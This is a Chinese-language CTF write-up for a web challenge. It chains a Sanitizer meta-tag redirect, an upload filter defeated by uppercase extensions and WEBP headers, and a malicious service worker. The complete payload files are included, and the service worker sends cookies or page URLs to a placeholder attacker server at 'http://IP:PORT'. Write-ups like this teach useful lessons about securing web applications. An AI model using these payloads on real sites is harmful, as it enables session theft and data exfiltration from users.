---
title: NeSE十二月升级赛WriteUp (Web)
date: 2022-12-20 00:14:20
categories:
  - CTF
---

一个硬核的XSS题，收获相当大（还得感谢CrumbledWall师傅点拨了我几次）

开局给了后端的源码，能看见里面用了腾讯的COS对象存储，可以上传文件到上面，docker-compose.yml里面还有一个名为的`bot`的服务但没有给出源码，能看出来后端有个接口会去连接这个`bot`。

<!-- more -->

```javascript
const express = require("express")
const isJpg = require('is-jpg')
const isPng = require('is-png')
const isWebp = require('is-webp')
const fs = require('fs')
const fileUpload = require('express-fileupload')
const bodyParser = require('body-parser')
const net = require('net')
const crypto = require("crypto")
const https = require('https')
var COS = require('cos-nodejs-sdk-v5')

const app = express()
const BOT_HOST = 'bot'
const BOT_PORT = 8080

app.use(fileUpload({
    limits: {
        fileSize: 2 * 1024 * 1024 // 2 MB
    },
    abortOnLimit: true
}))
app.use(bodyParser.urlencoded({ extended: true }))

async function uploadFileToCOS(file, fileName) {
    var cos = new COS({
        SecretId: 'xxxxxxxxxxxxxx',
        SecretKey: 'xxxxxxxxxxxxxx'
    });
    cos.putObject({
        Bucket: 'nese-1300117079',           /* 填入您自己的存储桶，必须字段 */
        Region: 'ap-beijing',                /* 存储桶所在地域，例如ap-beijing，必须字段 */
        Key: fileName,                       /* 存储在桶里的对象键（例如1.jpg，a/b/test.txt），必须字段 */
        Body: Buffer.from(file.data),        /* 必须 */
    }, function(err, data) {
        try {
            if (data.statusCode == 200) {
                return "File uploaded successfully! You can visit the file at " + data.Location
            } else {
                return "Failed!"
            }
        }
        catch (err) {
            return "Failed!"
        }
    })
}

app.get("/", (req, res) => {
    fs.readFile('index.html', 'utf-8', (err, data) => {
        if (err) throw err
        let generateNonce = crypto.randomBytes(16).toString("hex")
        const dataReplaced = data.replace(/nonce_must_be_replaced/g, generateNonce)
        res.write(dataReplaced)
        res.end()
    })
})

app.post('/upload/:md5', async (req, res) => {
    if (!req.files) return res.status(400).send(response('No files were uploaded.'))
    const md5Regex = /^[0-9a-fA-F]{32}$/
    const srcUrl = "https://nese-1300117079.cos.ap-beijing.myqcloud.com/"
    var suffix = req.files.newImage.name.split('.').slice(-1)
    var fileName = req.params.md5 + '.' + suffix
    if ((isPng(req.files.newImage.data) || isJpg(req.files.newImage.data) || isWebp(req.files.newImage.data)) && md5Regex.test(req.params.md5) && suffix != 'js' && suffix != 'html' && suffix != 'htm') {
        response = await uploadFileToCOS(req.files.newImage, fileName)
        res.send(response)
    } else {
        res.send("Failed!")
    }
})

app.post("/report", function (req, res) {
    const { url } = req.body
    if (url.search('https://challenge/') != 0) {
        return res.status(400).send('Invalid URL')
    }
    console.log(`[+] Sending ${url} to bot`)
    try {
        const client = net.connect(BOT_PORT, BOT_HOST, () => {
            client.write(url)
        })

        let response = ''
        client.on('data', data => {
            response += data.toString()
            client.end()
        })

        client.on('end', () => res.send(response))
    } catch (e) {
        console.log(e)
        res.status(500).send('Something is wrong...')
    }
})


const credentials = {
    key: fs.readFileSync('/opt/credentials/privatekey.pem'),
    cert: fs.readFileSync('/opt/credentials/certificate.pem')
};

const httpsServer = https.createServer(credentials, app)
httpsServer.listen(443)

/*
app.listen(8000, () => {
    console.log(`App 🚀 @ http://localhost:8000`)
})*/
```

## 寻找前端可控点

接下来看前端。首先发现前端有个异常严格的CSP，这里面的`nonce`每次刷新都会生成一个新的。

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'none'; object-src 'none'; img-src 'self' data: https://nese-1300117079.cos.ap-beijing.myqcloud.com/; script-src 'self' 'nonce-a068872e2c34b9f9687eada669107381'; style-src 'self' 'nonce-a068872e2c34b9f9687eada669107381'; frame-src https://nese-1300117079.cos.ap-beijing.myqcloud.com/ ">
```

然后是JS代码，首先发现有几个地方直接输出了HTML（当然有过滤）：

- `name` GET参数，会被`document.getElementById("username").setHTML`写到页面中，当然加了个HTML Sanitizer API进行过滤处理（这个似乎是浏览器直接实现的，也不知道内部的处理逻辑，但反正很严格就是了）；
- `img` GET参数，会被`<img src="${filter(image)}" />`写进页面中，这里的filter过滤了尖括号以及`..`，所以想提前闭合写入其他标签是不太可能了，只能给这个图片增减一些属性，再加上CSP的限制导致`onerror`这些脚本也会被ban掉，也没有什么利用价值；
- 提交上传文件的时候会返回`data`并写进页面，但这里的数据不可控，通过后端代码也能看见没什么用；
- Hash判断为`#mycollection`时会输出一个`iframe`，但很可惜这个值也不可控，写死在`const`里面；
- 最后是读取Cookie中flag的值，并且加盐MD5后作为COS的资源链接，输出一个iframe，这个后面再说。

```javascript
const filter = str => str.replace(/</g, '').replace(/>/g, '').replace(/\.\./g, '')
const url = new URL(location.href)
const srcUrl = "https://nese-1300117079.cos.ap-beijing.myqcloud.com/"
var name = "Anonymous"
var image = srcUrl + "default.png"

if (url.searchParams.get('name')!=='' && url.searchParams.get('name')!=null) {
    name = url.searchParams.get('name')
}
let sanitizer = new Sanitizer()
document.getElementById("username").setHTML('Hello, '+name+'! Here is your default avatar: ', {sanitizer: sanitizer})
if (url.searchParams.get('img')!=='' && url.searchParams.get('img')!==null) {
    image = url.searchParams.get('img')
}
document.write(`<img src="${filter(image)}" />`)

welcomeSrc = srcUrl + "welcome.html"
const user = {
    md5name: md5(name, 'salt'),
    firstcollection: welcomeSrc
}
showImage(name)

const form = document.querySelector('form')
form.addEventListener('submit', async (e) => {
    e.preventDefault()
    var formData = new FormData(form)
    const response = await fetch('/upload/'+user.md5name, {
        method: 'POST',
        body: formData
    })
    const data = await response.text()
    console.log(data)
    document.write(`<div>${data}</div>`)
})

if (document.location.hash==="#mycollection") {
    document.write(`<iframe width="1000" height="500" src="${user.firstcollection}" />`)
} else if (getCookie("flag") != undefined) {
    document.write(`<div>Here is the flag collection. <iframe src="${srcUrl}${md5(getCookie("flag"), 'salt')}.html" /></div>`)
}
```

综上发现只有三个地方是可控的，并且最后一个只能控制MD5。然后继续看后端代码会发现.html的后缀被ban了，因此这个MD5的可控也没办法访问到文件。

于是乎就只剩下这两个GET参数可用了，`img`这里由于filter的存在能做的事情也相当有限，尝试了各种各样的XSS Payload都没法整出来，只好作罢。

## 折腾Sanitizer

折腾了一阵子img之后发现没有什么进展，于是转换思路开始琢磨这个Sanitizer API的过滤有没有遗漏。询问了出题人，得到回答说并不需要绕过Sanitizer：

![](https://pic.hujiekang.top/uploads/big/14cfc6c97ff659502299af64673bb4a2.png)

但其他的点也都没有突破口，于是还是Fuzz了一下哪些标签可用，不会被过滤：

```javascript
// HTML tags array reference: https://xz.aliyun.com/t/7329#toc-8
var html = ["a", "abbr", "acronym", "address", "applet", "area", "article", "aside", "audio", "b", "base", "basefont", "bdi", "bdo", "bgsound", "big", "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "command", "content", "data", "datalist", "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "element", "em", "embed", "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", "frameset", "h1", "head", "header", "hgroup", "hr", "html", "i", "iframe", "image", "img", "input", "ins", "isindex", "kbd", "keygen", "label", "legend", "li", "link", "listing", "main", "map", "mark", "marquee", "menu", "menuitem", "meta", "meter", "multicol", "nav", "nextid", "nobr", "noembed", "noframes", "noscript", "object", "ol", "optgroup", "option", "output", "p", "param", "picture", "plaintext", "pre", "progress", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp", "script", "section", "select", "shadow", "slot", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "svg", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "xmp"];
html.forEach(h => {
    let u = document.getElementById("username");
    u.setHTML("<" + h + ">1</" + h + ">", { sanitizer: sanitizer });
    if (u.innerHTML.includes("<") && u.innerHTML.includes(">")) {
        console.log(h, u.innerHTML);
    }
})
```

输出如下：

```javascript
a, abbr, acronym, address, area, article, aside, audio, b, bdi, bdo, big, blockquote, br, button, canvas, center, cite, code, datalist, dd, del, details, dfn, dialog, dir, div, dl, dt, em, fieldset, figcaption, figure, font, footer, form, h1, header, hgroup, hr, i, image, img, input, ins, kbd, label, legend, li, link, listing, main, map, mark, marquee, menu, meta, meter, nav, nobr, ol, optgroup, option, output, p, picture, pre, progress, q, rb, rp, rt, rtc, ruby, s, samp, section, select, small, source, span, strike, strong, style, sub, summary, sup, table, time, track, tt, u, ul, var, video, wbr
```

一眼丁真发现了`<meta>`标签可以用，也就是说可以插入标签实现跳转到指定页面、刷新等操作。结合上传点的代码，发现限制也并不严格。结合这两点，我们可以XSS插入跳转到任意恶意页面的`<meta>`标签，而这个页面也可以自己编写然后上传至COS上，以此来Bypass掉CSP。

## 利用Service Worker劫持请求

然后在这卡住了半天，因为仅仅能够跳转加上普通的XSS也没办法拿到更多的信息（COS和主页也是跨域的，读不到Cookie等信息）。

直到队友提醒了一波可以用Service Worker，瞬间恍然大悟，第一想到的是[2020年西湖论剑的那个XSS题](https://www.secpulse.com/archives/145599.html)（因为是第一次在那碰到这个东西，所以印象极其深刻）。Service Worker可以理解为一个事件驱动的中间人代理，当这个东西被注册之后，对其所管理域下面的所有请求都会被Service Worker截获，随后便可以在里面进行任何非同步操作，再自定义一个返回的对象返回给浏览器。

于是乎，就有了个自动化跳转的劫持请求方案，下面浅浅画了个流程图：

![](https://pic.hujiekang.top/uploads/big/46f52debe3cbf009facafdd8071284b4.png)

图中首先Bot收到了我们发送的URL并访问，访问到包含XSS的Challenge页面，跳转到COS中存储的恶意页面Evil.html，该页面中包含创建并注册一个Service Worker的JS代码。注册完毕之后页面自动刷新，此时去往COS的流量就已经全部被Service Worker截获，依照攻击者编写的逻辑将访问页面的URL、Cookie等数据传送到攻击者的服务器中。

要注册一个合法的Service Worker需要满足下面几个要求：

- HTTPS（避免中间人攻击）

- 注册的JS Handler URI的MIME类型必须为text/javascript或者application/javascript等JS文件的合法MIME类型，否则会出现下面的错误：

  ![](https://pic.hujiekang.top/uploads/big/9c9a09f20c74f9b1ef186f093dd93b21.png)

- 注册的源必须和站点源一致，且注册的域范围最大不能超过JS文件所在的域路径（也就是说不能越到JS文件所在目录的上级目录，只能在其目录或子目录下注册）

根据MDN Manual中给的样例，可以注册一个Service Worker，如下面将`/`域下的请求都注册到`/evil.js`处理：

```javascript
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/evil.js', {
        scope: '/'
    }).then(function(reg) {
        console.log('Registration succeeded. Scope is ' + reg.scope);
    }).catch(function(error) {
        console.log('Registration failed with ' + error);
    });
};
```

evil.js中监听一个`fetch`的事件，每次域中拉取资源都会触发该事件，之后的每一次请求都会把当前请求的Cookie发送到攻击者的服务器中。事件中即可对事件的属性和页面的一些信息进行读取。但需要注意的是，Service Worker无法对DOM进行任何操作。

```javascript
this.addEventListener('fetch', function (event) {
    var url = event.request.clone();
    var body = "<script>window.open('http://IP:PORT/?'+document.cookie);</script>";
    var init = {headers: {"Content-Type": "text/html"}};
    event.respondWith(new Response(body, init));
});
```

每个Service Worker的有效时间为24小时，超时需要重新注册，当然也可以通过下面的代码提前释放所有的SW：

```javascript
 navigator.serviceWorker.getRegistrations().then(function(registrations) {
    for(let registration of registrations) {
            registration.unregister()
    }
 }).catch(function(err) {
     console.log('Service Worker registration failed: ', err);
 });
```

## 上传HTML和JS文件

由后端代码可知，会检查上传文件的文件头来判断是否为图片文件，还会检查文件的后缀名。首先判断是否为JPG/PNG/WEBP格式（其实都是判断文件头），随后判断文件后缀。很容易发现这里的文件后缀判断没有考虑大写的情况，因此可以直接绕过。

```javascript
if ((isPng(req.files.newImage.data) || isJpg(req.files.newImage.data) || isWebp(req.files.newImage.data)) && md5Regex.test(req.params.md5) && suffix != 'js' && suffix != 'html' && suffix != 'htm') {
    response = await uploadFileToCOS(req.files.newImage, fileName)
    res.send(response)
} else {
    res.send("Failed!")
}
```

对于HTML而言比较好处理，除了大写后缀的情况还有诸如`.shtml`、`.xhtml`等后缀可用，测试过后发现在COS上只有`.shtml`能够解析；对于JS文件而言则只有大写后缀一个处理方法，但JS文件还需考虑脏数据问题，因为文件内容的开头必须是图片的文件头，此时发现JPG和PNG的文件头都含有不可见字符，JS解析会直接报错，只有WEBP文件头可以全为ASCII字符，因此使用WEBP文件头构造一个变量赋值语句或注释即可绕过。

```javascript
RIFFAAAAWEBP = 1; // This works
//aaaaaaWEBP      // This also works
this.addEventListener('fetch', function (event) {
    ...
});
```

上传好了文件后，构造请求通过`/report`接口发送给Bot，等数据回显就可以了。整个流程如下：

1. 由Challenge页XSS跳转到COS上的1.html，用于注册Service Worker，注册完之后会跳转至2.html；
2. 2.html的内容为跳转回Challenge页，用于接收Flag。

下面是完整的Payload：

```html
<!-- db55d2f4ff948fbf228c738f322281e8.HTML -->
RIFFAAAAWEBP<!DOCTYPE html>
<html lang="en">
<script>
    if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('./db55d2f4ff948fbf228c738f322281e9.JS', {
        scope: '/'
    }).then(function(reg) {
        console.log('Registration succeeded. Scope is ' + reg.scope);
    }).catch(function(error) {
        console.log('Registration failed with ' + error);
    });
};location='./db55d2f4ff948fbf228c738f322281e0.HTML';
</script>
</html>
```

```javascript
// db55d2f4ff948fbf228c738f322281e9.JS
RIFFAAAAWEBP = 1;
this.addEventListener('fetch', function (event) {
    var url = event.request.clone();
    var body = "<script>window.open('http://IP:PORT/?'+document.URL);</script>";
    var init = {headers: {"Content-Type": "text/html"}};
    event.respondWith(new Response(body, init));
});
```

```html
<!-- db55d2f4ff948fbf228c738f322281e0.HTML -->
RIFFAAAAWEBP<!DOCTYPE html><html lang="en"><script>location='https://challenge';</script></html>
```

最后在服务器上会收到一个URL，访问即为Flag。直到拿到Flag我才知道，原来主页取Cookie中`flag`的值的目的是为了让Bot将Flag弹回来hhh，所以要将页面跳转回主页，触发Bot通过`iframe`请求Cookie加盐MD5后拼合得到Flag的图像。

![](https://pic.hujiekang.top/uploads/big/5432fa9f601f40461e2959c1e8392b12.png)

![](https://pic.hujiekang.top/uploads/big/399b473268e5bc3ae718ed2f5d81f4f5.png)

## Reference

- [Service Worker API - Web API 接口参考 | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API)
- [从一道CTF学习Service Worker的利用 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/145599.html)
- [WebP - Wikipedia](https://en.wikipedia.org/wiki/WebP)
- [CSP source values - HTTP | MDN (mozilla.org)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources)
- [HTML Sanitizer API (wicg.github.io)](https://wicg.github.io/sanitizer-api/)
